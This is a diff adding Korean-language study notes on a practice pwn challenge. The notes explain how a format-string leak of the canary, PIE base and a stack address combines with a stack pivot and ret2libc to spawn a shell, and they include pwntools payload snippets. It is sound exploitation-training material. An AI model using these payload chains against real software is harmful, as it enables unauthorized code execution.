@@ -1,0 +1,76 @@
+##day59 미니시험
+
+##문제
+day59-p1
+day59-p2
+
+##day59-p1
+보호기법
+- pie canart nx on Partial RELRO 심볼 x
+
+pop rdi, rsi 가젯과 leave ret가젯 확인 pivot 가능성 있음 pop rdx가 없어 인자 3개를 사용해야한다면 csu 가능성
+1차입력에서 fsb 발견 pie canary leak 가능
+2차입력 bof확인 근데 크기가 크지않아 pivot 해야할듯
+
+win 같은 함수가 없는걸로 보아 ret2libc인듯 여기서 문제가 생김
+1차에서 pie 카나리 leak하고 2차에서 puts leak해서 libc를 가져오고 다시 main으로 복귀하는 구조인데
+bof크기가 너무 작다 전역변수 입력또한 없음 bof크기가 작아 read plt 호출로 bss에 write 하는 방법도 불가능
+fsb를 이용해 bss에 fake stack을 작성하는 방법도 생각해봤지만 pie base를 알아야 bss주소도 알수있기 때문에
+불가
+새로운 개념 등장
+stack leak
+- 기존에 buf에는 의미없는 패딩 AAAA..로만 채웠는데 그 공간을 fake stack으로 쓰는 것
+즉 buf의 시작점을 알아야 한다
+pie ,canary 인덱스를 찾는 find 프로그램에서 stack 후보를 추가로 추린다 선정 기준은
+0x7fff... 이런식으로 시작하는 것 후보 몇개를 추린후에
+gdb에서 read에 브레이크를 걸고 실행
+read의 두번째 인자 rsi는 buf 즉 buf의 시작점인데 aslr때문에 이건 매번 랜덤하게 바뀐다 하드코딩 불가
+그래서 stack 후보가 중요함
+gdb 같은 실행에서 stack 후보 - buf 시작점 = diff
+이 동작을 3번 정도 반복 전부 같은값이 나오는 후보가  stack 인덱스 확정
+buf의 시작점이 매 실행마다 바뀌어도 buf + diff 위치에 있는 스택 주소를 알아내는것 
+즉 익스플로잇에서 diff를 알고 있고 stack 인덱스를 알고 있다면 1차 입력에서 인덱스를 넣고 나온 출력에
+diff를 빼면 buf 시작 주소가 나온다
+
+##payload
+1차 - payload1 = f"%{canary_idx}$p.%{pie_idx}$p,%{stack_idx}$p".encode() 
+2차 - fake_stack = flat(
+        0xdeadbeefdeadbeef,
+        pop_rdi,
+        puts_got,
+        puts_plt,
+        main,
+) A 대신 채워넣을 fake stack 
+main으로 돌아가는 이유는 당연히 libc base를 leak하고 남은 입력이 없기 때문에
+
+payload2 = fake_stack
+payload2 = payload2.ljust(offset, b"A")
+payload2 += p64(canary)
+payload2 += p64(buf_start)
+payload2 += p64(leave_ret)
+
+3차 - fake_stack = flat(
+        0xdeadbeefdeadbeef,
+        ret,
+        pop_rdi,
+        binsh,
+        system,
+)
+
+payload3 = fake_stack
+payload3 = payload3.ljust(offset, b"A")
+payload3 += p64(canary)
+payload3 += p64(buf_start2) buf_start2 를 쓰는 이유는 main 으로 복귀하면서 buf 시작 주소가 달라질 수 있기 때문
+					실제로 buf_start를 사용했을 때 실패했다
+payload3 += p64(leave_ret)
+
+
+
+
+##1차 시도 - 실패
+puts leak 파싱 실수였음 \n을 남겨놓고 파싱했으니 주소가 이상했다
+
+##2차 시도 - 성공
+쉘에 명령 입력 성공
+
+
